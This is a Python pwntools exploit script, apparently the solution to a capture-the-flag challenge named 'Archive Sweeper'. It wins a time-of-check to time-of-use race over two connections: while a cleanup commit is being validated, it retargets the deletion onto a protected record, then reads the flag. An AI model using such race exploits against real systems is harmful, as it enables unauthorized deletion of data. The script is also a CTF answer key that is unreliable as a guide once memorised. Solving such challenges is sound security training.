#!/usr/bin/env python3
import argparse
import getpass
import os
import re
import time
from pathlib import Path

from pwn import context, remote


PROMPT = b"cleanup> "
CLEANUP_ID = b"CLN-0007"
TARGET_RECORD = b"CAM042-20260919xxxxxx-Snapshot.png"


def storage_handle(record: bytes) -> bytes:
    value = 0x43435456
    for byte in record:
        value = ((value << 7) | (value >> 25)) & 0xFFFFFFFF
        value ^= byte
        value = (value + 0x9E3779B9) & 0xFFFFFFFF
    value ^= 0xA5C31F27
    return f"STG-{value:08x}".encode()


def token_from_file() -> str | None:
    base = Path(__file__).resolve().parent
    candidates = [
        Path.cwd() / "team_tokens.txt",
        base / "team_tokens.txt",
    ]
    candidates.extend(sorted(base.glob("*/team_tokens.txt")))

    for path in candidates:
        if not path.is_file():
            continue
        for line in path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#") and ":" in line:
                return line.split(":", 1)[1]
    return None


def connect(host: str, port: int, token: str):
    tube = remote(host, port)
    tube.sendlineafter(b"Team token: ", token.encode())
    banner = tube.recvuntil(PROMPT)
    if b"Invalid team token" in banner:
        raise RuntimeError("invalid team token")
    return tube


def command(tube, line: bytes, timeout: float = 3.0) -> bytes:
    tube.sendline(line)
    return tube.recvuntil(PROMPT, timeout=timeout)


def exploit(host: str, port: int, token: str) -> bytes:
    committer = connect(host, port, token)
    operator = connect(host, port, token)

    try:
        loaded = command(committer, b"cleanup load " + CLEANUP_ID)
        if b"Cleanup request loaded" not in loaded:
            raise RuntimeError(f"could not load request:\n{loaded.decode(errors='replace')}")

        # commit blocks this connection while the worker validates the approved
        # cache record.  The second connection can still mutate shared state.
        committer.sendline(b"cleanup commit")
        submitted = committer.recvuntil(b"submitted for validation.\n", timeout=3)
        if b"submitted for validation" not in submitted:
            raise RuntimeError("cleanup request was not submitted")

        version = None
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline:
            inspected = command(operator, b"cleanup inspect " + CLEANUP_ID)
            match = re.search(rb"Snapshot version\s*:\s*(\d+)", inspected)
            if match:
                version = int(match.group(1))
                break
            time.sleep(0.01)
        if version is None:
            raise RuntimeError("snapshot version was not exposed")

        handle = storage_handle(TARGET_RECORD)
        retargeted = command(
            operator,
            b"cleanup retarget "
            + handle
            + b" --if-version "
            + str(version).encode(),
        )
        if b"Cleanup target updated" not in retargeted:
            raise RuntimeError(f"retarget failed:\n{retargeted.decode(errors='replace')}")

        # Receiving this prompt means pthread_join() returned and deletion is
        # complete, so the following status request deterministically reveals
        # the integrity alert and flag.
        committer.recvuntil(PROMPT, timeout=4)
        result = command(committer, b"cleanup status")
        if b"Protected footage is no longer available" not in result:
            raise RuntimeError(f"exploit did not reach the flag path:\n{result.decode(errors='replace')}")
        return result.removesuffix(PROMPT)
    finally:
        committer.close()
        operator.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Archive Sweeper TOCTOU exploit")
    parser.add_argument("host", nargs="?", default=os.getenv("HOST", "pwnable.roomescapectf2026.site"))
    parser.add_argument("port", nargs="?", type=int, default=int(os.getenv("PORT", "40526")))
    parser.add_argument("token", nargs="?", default=os.getenv("TEAM_TOKEN"))
    args = parser.parse_args()

    token = args.token or token_from_file()
    if not token:
        token = getpass.getpass("CTFd Access Token: ")
    if not token:
        parser.error("CTFd Access Token required")

    context.log_level = os.getenv("LOG", "error")
    print(exploit(args.host, args.port, token).decode(errors="replace"), end="")


if __name__ == "__main__":
    main()
